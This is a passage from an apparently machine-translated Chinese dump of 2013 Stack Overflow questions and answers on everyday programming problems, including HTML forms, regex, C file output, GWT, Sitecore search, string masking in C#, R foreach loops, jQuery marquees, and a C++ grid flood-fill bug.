          <input type="button" name="quote" id="qpress" value="Show Quote" onClick="aquote()"/>
   </div> <br> <br>
        <div class="buttonLeft">
        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>" />  <!--Hidden token field-->
        <input type="text" id="hp" name="hp" />                                         <!--Hidden honeypot field-->
        <input type="submit" name="submit" value="Send form" />
        <input type="reset" name="reset" value="Reset" />
        </div>
    </fieldset>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:57:05.023

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <title> New Document </title>
  <meta name="Generator" content="EditPlus">
  <meta name="Author" content="">
  <meta name="Keywords" content="">
  <meta name="Description" content="">
 </head>

 <body>
  <form id="inputForm" method="post" onSubmit="return validateForm();" action="submit.php">  
    <fieldset>
<label>First Name:</label>
        <input type="text" name="first_name" />
        <br />
        <label>Surname:</label>
        <input type="text" name="surname" />
        <br />
        <label>Mobile:</label>
        <input type="text" name="mobile" />
        <br />
        <label>Email:</label>
        <input type="text" name="email" /><br />
<div class="textRightform">
<label class="radio2">Pool package:</label><br>
 <input type="radio" name="pack" value="2000"
            checked="checked" />Rectanguluar
            <input type="radio" name="pack" value="2500" onClick="getCheckedRadio()"/>Rectangluar with Spa
            <input type="radio" name="pack" value="3000" />Round Pool
            <input type="radio" name="pack" value="3500" />Round Pool with Spa<br><br>
         <label>Length meters</label><input name="length" type="number" size="7" maxlength="4"><br>
         <label>Width meters</label><input name="width" type="number" size="8" maxlength="4"><br><br>
         <input name="quoteshow" type="text" value="" id="qprice" readonly /><br>
          <input type="button" name="quote" id="qpress" value="Show Quote" onClick="aquote()"/>
   </div> <br> <br>
        <div class="buttonLeft">
        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>" />  <!--Hidden token field-->
        <input type="text" id="hp" name="hp" />                                         <!--Hidden honeypot field-->
        <input type="submit" name="submit" value="Send form" />
        <input type="reset" name="reset" value="Reset" />
        </div>
    </fieldset>
</form>
 </body>
 <script>

 function aquote()
 {
 var radios = document.getElementsByName('pack');
var packValue =0;
for (var i = 0, length = radios.length; i < length; i++) {
    if (radios[i].checked) {
       packValue = radios[i].value;
    }
}
alert(parseInt(packValue));
}
 </script>
</html> 
```

# regex - 如何修改此正则表达式以排除第 3 类结果

> ID：15262211
> 
> 赞同：0
> 
> 时间：2013-03-07T02:53:55.607
> 
> 标签：regex

以下是搜索字符串中可能出现的三种模式：

```
<a href=".+?" target="_blank" id="">.+?</a>
<a href=".+?" target="_blank" id=""><font color=green>.+?</font></a>
<a href=".+?" target="_blank" id=""><b><font color=green>.+?</font></b></a> 
```

我写的表达式匹配以上所有内容：

```
<a href="(.+?)" target="_blank" id="">(<font color=.+?>)?(.+?)(</font>)?</a> 
```

如何编写正则表达式以仅匹配第一个和第二个字符串，结果中应排除第三个字符串。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:57:54.140

通常，您[应该避免](https://stackoverflow.com/a/1732454/1204143)使用正则表达式解析 (X)HTML。

在您的情况下，您可以使用类似的表达式来避免匹配包含文本中的标签

```
<a href="(.+?)" target="_blank" id="">(<font color=.+?>)?([^<]*?)(</font>)?</a> 
```

请注意，这将忽略内容中的*所有*标签`<a>`。

# c - fprintf 不工作 C

> ID：15262220
> 
> 赞同：0
> 
> 时间：2013-03-07T02:55:06.217
> 
> 标签：c, char, printf

我正在尝试制作一个写入 .txt 文件的简单程序，但此代码不起作用。

```
#include <stdio.h>
#include <string.h>
#include "main.h"

int main(int argc, const char * argv[])
{
    FILE *f = fopen("text.txt", "w+");
    char c[256];
    printf("What's your name?\n");
    scanf("%s", c);
    fflush(f);
    if (c!=NULL) 
    {
        printf("not null\n");
        int q = fprintf(f, "%s", c);
        printf("%d", q);
    }
    else
    {
        printf("null\n");
    }
    printf("Hello, %s\n", c);
    fclose(f);
    return 0;
} 
```

`printf`返回它不为空，并且返回无论 char的`int q`长度是多少。为什么不写入文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:03:21.837

> printf 返回它不为空，

那是因为 c 不是 null ，因为您已将名称字符串扫描到其中。

> 为什么不写入文件？

该程序在我的系统上运行良好。

- 编辑 -

```
FILE *f = fopen("text.txt", "w+");
if (NULL == f)
  perror("error opening file\n"); 
```

通过以这种方式进行错误处理，将显示确切的原因（在您的情况下是权限），

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:06:35.523

首先，您已经`c`在本地范围内声明，所以它永远不会是`NULL`. 如果您想检查用户是否输入了任何内容，请检查`c`您在字符串中扫描后的长度：

```
if (strlen(c) == 0) {
    ///
} 
```

其次，检查您是否有权写入当前工作目录。您应该检查的返回值`fopen`：

```
if (!f) {
    fprintf(stderr, "Failed to open text.txt for writing\n");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:02:22.133

原来我没有使用正确的权限运行。我犯了愚蠢的错误。

# java - 如何使用 GWT 获取“父”元素

> ID：15262225
> 
> 赞同：2
> 
> 时间：2013-03-07T02:55:27.157
> 
> 标签：java, gwt, errai

假设我的 GWT 应用程序中有 html 部分：

```
 <ul>
        <li id="tray-active"><a data-field="home">Homepage</a></li> <!-- Active page -->
        <li><a data-field="news">News</a></li>
        <li><a data-field="products">Products</a></li>
        <li><a data-field="sales">General Sales T&C</a></li>
        <li><a data-field="job">Job Opportunities</a></li>
    </ul> 
```

而且我能够获得 AnchorElement，例如主页：

```
@Inject @DataField Anchor home; 
```

如何获取 List`li`元素？

是：`home.getParent(); // which returns a widget`？然后将其转换为`UListElement`? 是这样吗？

**更新：**

我的主要目标是将`li`元素的 id 设置为“tray-active”，因此当单击锚项目时，“parent”`li`元素设置为“tray-active”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T05:08:40.293

不需要铸造任何东西。

你可以这样做：

```
home.getParent().getElement().setId("tray-active"); 
```

[API](http://google-web-toolkit.googlecode.com/svn/javadoc/1.5/com/google/gwt/dom/client/Element.html#setId%28java.lang.String%29)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-30T22:08:43.770

这应该为您提供所需的 Element 对象：

```
anchor.getElement().getParentElement() 
```

其中锚是你的锚元素。

```
anchor.getElement() 
```

给你锚元素和

```
anchor.getElement().getParentElement() ; 
```

将为您提供锚的元素父级，在您的情况下应该是 li 元素

现在，如果您想为此元素设置一个属性，例如 id，请执行以下操作：

```
anchor.getElement().getParentElement().setAttribute("id", "li_id") ; 
```

# lucene - Sitecore 搜索排名

> ID：15262235
> 
> 赞同：1
> 
> 时间：2013-03-07T02:56:30.877
> 
> 标签：lucene, sitecore, sitecore6

Sitecore/Lucene 是否支持内容过滤/排名？

我找不到任何相关文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:51:35.380

Lucene 返回排名结果，您可以使用 QueryOccurance.MustNot 子句构建查询以过滤结果，或使用 QueryOccurance.Should 子句来提升结果。

来自 Sitecore 的QueryOccurance 类[文档：](http://sdn.sitecore.net/Reference/Sitecore%206/Sitecore%20Search%20and%20Indexing.aspx)

> Lucene 对复杂查询中的搜索词使用以下运算符：
>  **Must** – 搜索词必须出现在文档中才能包含在搜索结果中。
> **应该**- 搜索词可能出现在文档中但不是必需的，并且该文档可能包含在基于其他条件的搜索结果中。但是，包含搜索词的文档的排名高于不包含搜索词的等效文档。
> **不得** - 搜索词不得出现在文档中，以便包含在搜索结果中。带有搜索词的文档将从结果中排除

Sitecore 中 Lucene 的一些额外资源：

*   **Lucene 查询语法**：[http ://sitecoregadgets.blogspot.com/2009/11/working-with-lucene-search-index-in_25.html](http://sitecoregadgets.blogspot.com/2009/11/working-with-lucene-search-index-in_25.html)
*   **Lucene 演练**： http: [//learnsitecore.cmsuniverse.net/en/Developers/Articles/2009/06/LuceneQuery1.aspx](http://learnsitecore.cmsuniverse.net/en/Developers/Articles/2009/06/LuceneQuery1.aspx)
*   **Alex Shyba 的 Lucene 帖子**：[http ://sitecoreblog.alexshyba.com/search/label/lucene](http://sitecoreblog.alexshyba.com/search/label/lucene)

这个问题也可能有用：[Sitecore + Lucene + QueryOccurance.Should not return desired results](https://stackoverflow.com/questions/10384823/sitecore-lucene-queryoccurance-should-not-returning-desired-results?rq=1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-11T01:35:18.447

Sitecore 有内置的 sitecore_master_content、sitecore_web_content、sitecore_core_content 索引，这些索引正在索引 Sitecore 中的所有内容，并且已经有一个 API 来搜索这些索引。您可以在 Sitecore“索引”项目部分中指定提升值（默认为空）。

您还可以为搜索查询中的字段设置提升。

# asp.net-mvc - 保留 ASP.NET MVC 控制器名称？

> ID：15262243
> 
> 赞同：3
> 
> 时间：2013-03-07T02:57:20.990
> 
> 标签：asp.net-mvc, asp.net-mvc-4, reserved-words

所以我只是花了一个小时来调试为什么我收到客户端 404 和服务器`System.Web.Http.HttpResponseException`端`System.Web.Http.dll!System.Web.Http.Dispatcher.DefaultHttpControllerSelector.SelectController(System.Net.Http.HttpRequestMessage request) + 0x33f byte`; 无论我尝试什么，我都无法让我的 ApiController 衍生产品接收请求。

最后，在尝试将其转换为常规`Controller`无效后，我想到将名称从更改`APIController`为`APIXController`仅以使一切正常。

1.  它在哪里声明`API`是保留的控制器名称？
2.  保留控制器名称的完整列表在哪里？
3.  是否可以绕过使用`APIController`我的班级名称的限制，如果可以，我该怎么做？

我检查的第一件事是我的路线配置，这是沼泽标准

```
routes.MapRoute(
                "Default",
                "{controller}/{action}/{id}",
                new { controller = "Home", action = "Index", id = UrlParameter.Optional }
            ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:05:03.250

APIController 不是保留名称。但是，如果您使用的是标准 MVC4 模板，那么默认情况下它包含一个 WebAPI 堆栈的实例，并且这会注册一个以 /api 开头的路由

你很可能会遇到这种情况。

查看 AppStart 下的 WebApiConfig.cs 文件。

顺便说一句，关键的调试症状是 WebApi 使用的 System.Web.Http 中的任何内容，并且不会出现在 MVC 应用程序中。

# c# - 屏蔽除最后 n 个字符之外的字符串的所有字符

> ID：15262244
> 
> 赞同：17
> 
> 时间：2013-03-07T02:57:35.797
> 
> 标签：c#, string

我想知道如何用“除了最后一个数字字符”的条件替换字符串的字符？

例子：

```
string = "4111111111111111"; 
```

我想做到这一点

```
new_string = "XXXXXXXXXXXXX1111" 
```

在此示例中，我将字符替换为“X”，最后 4 个字符除外。

我怎么可能做到这一点？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-03-07T03:02:42.490

那会适合你吗？

```
var input = "4111111111111111";
var length = input.Length;
var result = new String('X', length - 4) + input.Substring(length - 4);

Console.WriteLine(result);

// Ouput: XXXXXXXXXXXX1111 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-03-07T03:05:10.880

怎么样...之类的

```
new_string = new String('X', YourString.Length - 4)
                  + YourString.Substring(YourString.Length - 4); 
```

根据当前字符串 -4 的长度创建一个新字符串，并将其全部设为“X”。然后添加原始字符串的最后 4 个字符

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-03-07T03:04:01.780

这是一种思考的方法。呼叫最后一个数字字符离开`n`：

1.  将替换多少个字符`X`？字符串减去的长度`n`。
2.  我们如何用其他字符替换字符？您不能直接修改 a `string`，但可以构建一个新的。
3.  如何`n`从原始字符串中获取最后一个字符？有几种方法可以做到这一点，但最简单的可能是[`Substring`](http://msdn.microsoft.com/en-us/library/hxthx5h6.aspx)，它允许我们通过指定起点和可选的终点来抓取字符串的一部分。

所以它看起来像这样（`n`从原始字符中留下的字符数在哪里，并且`str`是原始字符串 -`string`不能是变量的名称，因为它是保留关键字）：

```
// 2\. Start with a blank string
var new_string = "";

// 1\. Replace first Length - n characters with X
for (var i = 0; i < str.Length - n; i++)
    new_string += "X";

// 3\. Add in the last n characters from original string.
new_string += str.Substring(str.Length - n); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-06-13T16:53:37.403

对于您的要求，这可能有点矫枉过正。但这里有一个快速的扩展方法可以做到这一点。

它默认使用 x 作为掩码字符，但可以使用可选字符进行更改

```
 public static class Masking
{
    public static string MaskAllButLast(this string input, int charsToDisplay, char maskingChar = 'x')
    {
        int charsToMask = input.Length - charsToDisplay;
        return charsToMask > 0 ? $"{new string(maskingChar, charsToMask)}{input.Substring(charsToMask)}" : input;
    }
} 
```

这里有一个单元测试来证明它有效

```
 using Xunit;

    namespace Tests
{
    public class MaskingTest
    {
        [Theory]
        [InlineData("ThisIsATest", 4, 'x', "xxxxxxxTest")]
        [InlineData("Test", 4, null, "Test")]
        [InlineData("ThisIsATest", 4, '*', "*******Test")]
        [InlineData("Test", 16, 'x', "Test")]
        [InlineData("Test", 0, 'y', "yyyy")]
        public void Testing_Masking(string input, int charToDisplay, char maskingChar, string expected)
        {
            //Act
            string actual = input.MaskAllButLast(charToDisplay, maskingChar);

            //Assert
            Assert.Equal(expected, actual);
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-07T03:04:49.033

```
StringBuilder sb  = new StringBuilder();
Char[] stringChar = string.toCharArray();
for(int x = 0; x < stringChar.length-4; x++){
    sb.append(stringChar[x]);
}
sb.append(string.substring(string.length()-4));

string = sb.toString(); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-09-13T17:45:00.207

这里的其他一些简洁答案没有考虑少于 n 个字符的字符串。这是我的看法：

```
 var length = input.Length;                
 input = length > 4 ? new String('*', length - 4) + input.Substring(length - 4) : input; 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-07T03:06:09.570

我想你可以使用`Select`index

```
string input = "4111111111111111";
string new_string = new string(input.Select((c, i) => i < input.Length - 4 ? 'X' : c).ToArray()); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-03-07T04:12:50.367

lui，请试试这个...

```
string dispString = DisplayString("4111111111111111", 4); 
```

创建一个传递原始字符串且没有数字的函数。

```
 public string DisplayString(string strOriginal,int lastDigit)
    {
        string strResult = new String('X', strOriginal.Length - lastDigit) + strOriginal.Substring(strOriginal.Length - lastDigit);
        return strResult;
    } 
```

可能对你有帮助......

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-08-23T22:04:14.160

尝试这个：

```
String maskedString = "...."+ (testString.substring(testString.length() - 4, testString.length())); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-10-06T21:14:56.547

派对迟到了，但我还想屏蔽除最后一个“x”字符之外的所有字符，但只屏蔽数字或字母，以便仍然显示任何 - ()、其他格式等。这是我的快速扩展方法 - 希望它可以帮助某人。我从 Luke Hammer 的示例开始，然后根据我的需要改变了胆量。

```
public static string MaskOnlyChars(this string input, int charsToDisplay, char maskingChar = 'x')
    {
        StringBuilder sbOutput = new StringBuilder();
        int intMaskCount = input.Length - charsToDisplay;

        if (intMaskCount > 0) //only mask if string is longer than requested unmasked chars
        {
            for (var intloop = 0; intloop < input.Length; intloop++)
            {
                char charCurr = Char.Parse(input.Substring(intloop, 1));
                byte[] charByte = Encoding.ASCII.GetBytes(charCurr.ToString());
                int intCurrAscii = charByte[0];

                if (intloop <= (intMaskCount - 1))
                {
                    switch (intCurrAscii)
                    {
                        case int n when (n >= 48 && n <= 57):
                            //0-9
                            sbOutput.Append(maskingChar);
                            break;

                        case int n when (n >= 65 && n <= 90):
                            //A-Z
                            sbOutput.Append(maskingChar);
                            break;

                        case int n when (n >= 97 && n <= 122):
                            //a-z
                            sbOutput.Append(maskingChar);
                            break;

                        default:
                            //Leave other characters unmasked
                            sbOutput.Append(charCurr);
                            break;
                    }
                }
                else
                {
                    //Characters at end to remain unmasked
                    sbOutput.Append(charCurr);
                }
            }
        }
        else
        {
            //if not enough characters to mask, show unaltered input
            return input;
        }
        return sbOutput.ToString();
    } 
```

# r - 使用 foreach 将多个正常循环转换为并行循环

> ID：15262246
> 
> 赞同：0
> 
> 时间：2013-03-07T02:57:39.233
> 
> 标签：r, foreach, parallel-processing

如何使用**foreach**包将普通循环转换为并行循环？

我尝试从**vrtest**包中转换此代码

```
CvMexpb <- matrix(0,nrow=B,ncol=2)

           for(k in 1:B)
           {
            eb <- e * Mammen2(n)
            eb <- eb - mean(eb)
            tem <- 0

           for( j in 1:(n-1) ) 
           { 
           aux2 <- 1/((j*pi)*(j*pi))
           aux2 <- aux2/(n-j+1)
           tem <- tem+aux2* t(eb[(1+j):n]) %*% weiexp[1:(n-j),1:(n-j)] %*% eb[(1+j):n]
           }

           CvMexpb[k,] <- cbind(tem/v > CvMexp,tem/v)
           }    

        pboot <- mean(CvMexpb[,1])
        Critboot <- quantile(CvMexpb[,2],c(0.9,0.95,0.99))
        return(pboot) 
```

进入

```
CvMexpb <- foreach(k = 1:B, .combine='cbind') %:%
           {
            eb <- e * Mammen2(n)
            eb <- eb - mean(eb)
            tem <- 0

           foreach(j = 1:(n-1), .combine='c') %dopar%
           { 
           aux2 <- 1/((j*pi)*(j*pi))
           aux2 <- aux2/(n-j+1)
           tem <- tem+aux2* t(eb[(1+j):n]) %*% weiexp[1:(n-j),1:(n-j)] %*% eb[(1+j):n]
           }

           CvMexpb[k,] <- cbind(tem/v > CvMexp,tem/v)
           }    

        pboot <- mean(CvMexpb[,1])
        Critboot <- quantile(CvMexpb[,2],c(0.9,0.95,0.99))
        return(pboot) 
```

但返回错误

> foreach(k = 1:B, .combine = "cbind") %:% { : "%:%" 中的错误传递了一个非法的右操作数

原始完整代码是

```
compweexp <- 
function(inf) 
{
n <- length(inf)
weiexp <- matrix(1,nrow=n,ncol=n)
for(i in 1:n)
{
    for(j in (i+1):n)
    {
    if(j > n) break
    aux1 <- (inf[i]-inf[j]) %*% t(inf[i]-inf[j])
    weiexp[i,j] <- exp(-0.5*aux1)
    weiexp[j,i] <- weiexp[i,j]
    }
}
return(weiexp)
}

Mammen <-
function(n)
{
p <- (sqrt(5)+1)/(2*sqrt(5))
zmat <- rep(1,n)*(-(sqrt(5)-1)/2);
u <- runif(n,0,1)
zmat[u > p] <- (sqrt(5)+1)/2
return(zmat)
}

Gen.Spec <- 
function(y,B=300)
{
set.seed(12345)
n<- length(y)
e <- y - mean(y)
v <- var(e)
y1 <- y[1:(n-1)]
weiexp <- compweexp(y1)
CvMexp <- 0

for(j in 1:(n-1)) {
   aux2 <- 1/((j*pi)^2)
   aux2 <- aux2/(n-j+1)
   CvMexp <- CvMexp+ aux2* t(e[(1+j):n]) %*% weiexp[1:(n-j),1:(n-j)] %*% e[(1+j):n]
}
CvMexp <- CvMexp/v

CvMexpb <- matrix(0,nrow=B,ncol=2)
for(k in 1:B)
{
    eb <- e * Mammen(n)
    eb <- eb - mean(eb)
    tem <- 0
    for( j in 1:(n-1) ){
    aux2 <- 1/((j*pi)^2)
    aux2 <- aux2/(n-j+1)
    tem <- tem+aux2* t(eb[(1+j):n]) %*% weiexp[1:(n-j),1:(n-j)] %*% eb[(1+j):n]
    }
    CvMexpb[k,] <- cbind(tem/v > CvMexp,tem/v)

}    

pboot <- mean(CvMexpb[,1])
Critboot <- quantile(CvMexpb[,2],c(0.9,0.95,0.99))
return(pboot)
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T21:20:18.850

您收到一条错误消息，因为 '%:%' 运算符的正确参数必须是另一个 foreach 表达式。没有标准的方法来包含内部 foreach 循环的初始化代码。doMPI 包确实提供了这种机制。

但另一个问题是，您的内部 for 循环不能以这种方式并行化，因为您正在根据循环的前一次迭代中计算的值设置“tem”变量。您可以通过仅对外部循环使用 foreach 来解决这两个问题：

```
CvMexpb <- foreach(k=1:B, .combine='rbind', .export='Mammen2') %dopar% {
  eb <- e * Mammen2(n)
  eb <- eb - mean(eb)
  tem <- 0
  for( j in 1:(n-1) )
  {
    aux2 <- 1/((j*pi)*(j*pi))
    aux2 <- aux2/(n-j+1)
    tem <- tem+aux2* t(eb[(1+j):n]) %*% weiexp[1:(n-j),1:(n-j)] %*% eb[(1+j):n]
  }
  cbind(tem/v > CvMexp,tem/v)
} 
```

这将导致更少的任务需要更长的计算时间，这可能是也可能不是一件好事。

# javascript - 在 html 元素中显示 Jquery 数据

> ID：15262247
> 
> 赞同：0
> 
> 时间：2013-03-07T02:57:46.893
> 
> 标签：javascript, jquery, html

这会从文本文件中获取文本并显示它，每五秒刷新一次。我希望文本在屏幕公告横幅样式中滚动。选框只是一个占位符，我该怎么做呢？

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<title>Raffle Winers</title>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="jquery.marquee.js"></script>
<style type="text/css">
            body {
          margin: 10px;
          font-family: 'Lato', sans-serif;
        }
        small {
            font-size: 14px;
        }
        h1 {
            margin-bottom: 20px;
            padding-bottom: 10px;
            text-align: center;
        }

        h2 {
            border-bottom: 1px dotted #ccc;
            padding-bottom: 5px;
            margin-bottom: 10px;
        }

        .marquee, .marquee-with-options {
          width: 300px;
          overflow: hidden;
          border:1px solid #ccc;
        }
    </style>
    <script>
        $(function(){
            var $mwo = $('.marquee-with-options');
            $('.marquee').marquee();
            $('.marquee-with-options').marquee({
                //speed in milliseconds of the marquee
                speed: 5000,
                //gap in pixels between the tickers
                gap: 50,
                //gap in pixels between the tickers
                delayBeforeStart: 0,
                //'left' or 'right'
                direction: 'left',
                //true or false - should the marquee be duplicated to show an effect of continues flow
                duplicated: true,
                //on hover pause the marquee - using jQuery plugin https://github.com/tobia/Pause
                pauseOnHover: true
            });

            //pause and resume links
            $('.pause').click(function(e){
                e.preventDefault();
                $mwo.trigger('pause');
            });
            $('.resume').click(function(e){
                e.preventDefault();
                $mwo.trigger('resume');
            });
            //toggle
            $('.toggle').hover(function(e){
                $mwo.trigger('pause');
            },function(){
                $mwo.trigger('resume');
            })
            .click(function(e){
                e.preventDefault();
            })
        });
    </script>

</head>
<body>

<script type="text/javascript">
        setInterval(read,100);
    function read(){
    jQuery.get('rafflewinners.txt',function(data){$('#container').html(data);});
}
</script>

<div id="container"></div>

<div id="container" data-speed="2000" data-gap="30" data-direction="right" class='marquee'>#container</div>

</body> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T06:12:32.730

如果在初始化后更改了 DIV 的内容，marquee 插件将停止工作。您必须再次启动它。

```
function read(){
    jQuery.get('rafflewinners.txt',function(data){
        $('#container').html(data).marquee();
    });
} 
```

看到这个[小提琴](http://jsfiddle.net/barmar/bCcq6/1/)

# c++ - 为什么这个代码顺序不能正常工作？

> ID：15262248
> 
> 赞同：-1
> 
> 时间：2013-03-07T02:57:49.740
> 
> 标签：c++, logic, if-statement

所以我一直在这个程序的一部分上工作了几个小时。我有几行代码已经困扰了我一个多小时。这没有任何意义。我一遍又一遍地阅读这些台词，并在脑海中思考它应该做什么，但它没有这样做！这可能是我一直忽略的一些愚蠢的错误（通常发生在我身上..），或者可能是由于缺乏睡眠/过去几个小时一直在努力。

该程序很长，但我遇到问题的代码块只有几行 - 所以我只会在需要时发布整个内容。

* * *

好的，所以这里是应该做的快速运行：

我有一个向量，里面装满了手动设置的字符串（19 个，每个 79 个字符长）。这个一维向量将被视为二维向量 - 因为我试图保持它的基本。所以这个字符串向量，如果每行显示 1 个字符串，基本上会创建一个带有“.”矩形部分的网格。以及连接矩形部分的“#”路径。它应该得到一个 x 和 y 坐标，并传递给函数。它像二维向量一样循环并找到位置。它检查该位置的字符是否不是“。” 或 '#' 否则，它将字符更改为 X 以标记其位置。我使用有效的 x,y 坐标设置测试，该坐标是“。”的位置。- 问题就在我 cout "match found:::" 的行之后，当程序运行时，它显示 vLevel[i][j] = '.' 的值 但由于某种原因，它没有转到函数被调用 4 次的 else 语句，我把 cout 语句。这是网格的样子。空格是空格..每一行都是向量中的一个字符串：

```
.......                                                                    
.......  .......                                                           
.......##.......      ..........................                           
.......  .......      ..........................                           
         .......      ..........................     ..........            
         .......      ..........................#####..........            
                      ..........................     ..........            
                      ..........................           #               
                      ..........................           #               
                       #                                   #               
                       #                                   #               
    ........           #   ............                .......             
    ........           #   ............                .......             
    ........           #   ............    ....        .......             
    ........###############............    ....        .......             
    ........               ............####....                            
    ........               ............    .... 
```

* * *

这是我正在处理的代码部分：

```
void markPosition(vector<string> & vLevel, int x, int y){
    cout << "x: " << x <<endl;
    cout << "y: " << y <<endl;

    bool doubleCheck = true; //extra bool I added for testing purposes

    for( int i = 0; i < vLevel.size(); i++ ){
            for( int j = 0; j < vLevel[i].size(); j++ ){
                    //displays if x and/or y are out of range
                    if (doubleCheck){
                            if ((x < 0) || (x > vLevel[i].size())){
                                    cout << "X is out of range!" << endl;
                                    doubleCheck = false;
                            }
                            if ((y < 0) || (y > vLevel.size())){
                                    cout << "Y is out of range!" << endl;
                                    doubleCheck = false;
                            }
                    }
                    else {
                            return;
                    }

                    if ((j == x) && (i == y)){
     //////THIS IS THE PROBLEM LOL
                            cout << "match found::: " << vLevel[i][j] << endl;
                            if ((vLevel[i][j] != '.') || (vLevel[i][j] != '#')){
                                    cout << "Located in the blankness" << endl;
                                    return;
                            }

                            else {
                                    cout << "I don't get reached!!??" << endl;
                                    vLevel[i][j] = 'X';
                                    markPosition(vLevel,i-1,j);
                                    markPosition(vLevel,i+1,j);
                                    markPosition(vLevel,i,j+1);
                                    markPosition(vLevel,i,j-1);
                           }
                      }
                }
        }
} 
```

* * *

粘贴时间距搞砸了，所以我试着清理一下。我不明白为什么它会跳过其他。就像我说的，我敢肯定，一旦解决了这个问题，我会感到很愚蠢。我需要睡觉大声笑。

如果您需要更多信息，请告诉我。先谢谢了！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:03:47.703

看着：

```
if ((vLevel[i][j] != '.') || (vLevel[i][j] != '#')) 
```

这将*始终*评估为`true`。想想看。

（我想你的意思是`if((!=)&&(!=))`或`if(!((==)||(==)))`。）

# json - 用于 json 的 Wordpress RSS 提要

> ID：15262249
> 
> 赞同：-2
> 
> 时间：2013-03-07T02:57:50.623
> 
> 标签：json, wordpress, rss

我只想问！如果 wordpress 中的这个插件仍然在最新版本中工作？

[http://wordpress.org/extend/plugins/json-feed/](http://wordpress.org/extend/plugins/json-feed/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:06:15.560

看起来它应该可以正常工作，我在新的 3.5.1 中已过时的一个 php 文件中没有看到任何内容

# java - 我如何在java中比较颜色？

> ID：15262258
> 
> 赞同：8
> 
> 时间：2013-03-07T02:58:52.603
> 
> 标签：java, random, colors, rgb

我试图制作一个随机颜色生成器，但我不希望类似的颜色出现在 arrayList 中

```
public class RandomColorGen {

public static Color RandColor() {
    Random rand = new Random();
    float r = rand.nextFloat();
    float g = rand.nextFloat();
    float b = rand.nextFloat();
    Color c = new Color(r, g, b, 1);
    return c;

}

public static ArrayList<Color> ColorList(int numOfColors) {
    ArrayList<Color> colorList = new ArrayList<Color>();
    for (int i = 0; i < numOfColors; i++) {
        Color c = RandColor();
        if(similarcolors){
            dont add
        }
        colorList.add(c);

    }
    return colorList;
}

} 
```

我真的很困惑请帮忙:)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-07T03:15:15.283

在 Color 类中实现similarTo() 方法。

然后使用：

```
public static ArrayList<Color> ColorList(int numOfColors) {
    ArrayList<Color> colorList = new ArrayList<Color>();
    for (int i = 0; i < numOfColors; i++) {
        Color c = RandColor();
        boolean similarFound = false;
        for(Color color : colorList){
            if(color.similarTo(c)){
                 similarFound = true;
                 break;
            }
        }
        if(!similarFound){
            colorList.add(c);
        } 

    }
    return colorList;
} 
```

要实现similarTo：

看看[RGBA 颜色空间中的颜色相似度/距离，](https://stackoverflow.com/questions/4754506/color-similarity-distance-in-rgba-color-space)并以[编程方式查找相似颜色](https://stackoverflow.com/questions/1725505/finding-similar-colors-programatically)。一个简单的方法可以是：

((r2 - r1) ² + (g2 - g1) ² + (b2 - b1) ² ) ^(1/2)

和：

```
boolean similarTo(Color c){
    double distance = (c.r - this.r)*(c.r - this.r) + (c.g - this.g)*(c.g - this.g) + (c.b - this.b)*(c.b - this.b)
    if(distance > X){
        return true;
    }else{
        return false;
    }
} 
```

但是，你应该根据你的想象找到你的 X 类似的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-08-04T07:43:31.837

我试过了，效果很好：

```
Color c1 = Color.WHITE;
Color c2 = new Color(255,255,255);

if(c1.getRGB() == c2.getRGB()) 
    System.out.println("true");
else
    System.out.println("false");
} 
```

该`getRGB`函数返回一个带有红色蓝色和绿色之和的 int 值，因此我们比较的是整数而不是对象。

# ms-access - access 2007 中的数据类型

> ID：15262259
> 
> 赞同：0
> 
> 时间：2013-03-07T02:58:57.260
> 
> 标签：ms-access, ms-access-2007, type-conversion

我有这个描述**部门总计 500**，当我将数据类型声明为数字或文本时，它会显示一条错误消息。我应该使用什么数据类型？我在下面有这个选项

![ms 访问数据类型](../Images/233781fc7b5d3941da47374609778965.png)

# java - 这个递归函数内部发生了什么？

> ID：15262260
> 
> 赞同：1
> 
> 时间：2013-03-07T02:59:01.153
> 
> 标签：java, recursion

我有这个递归阶乘函数：

```
public class Driver{
public static void main (String args[])
{

    System.out.println(factorial(5));

}

private static int factorial(int n)
{
    int product;
    if (n <= 2){ product = n; return 2;}
    else{
        product = n * factorial(n-1);
        System.out.println("current product =" + product);
        System.out.println("product = " + n + " * factorial(" + (n-1) + ")");
    }
    return product;
}
} 
```

它打印以下内容：

```
current product =6
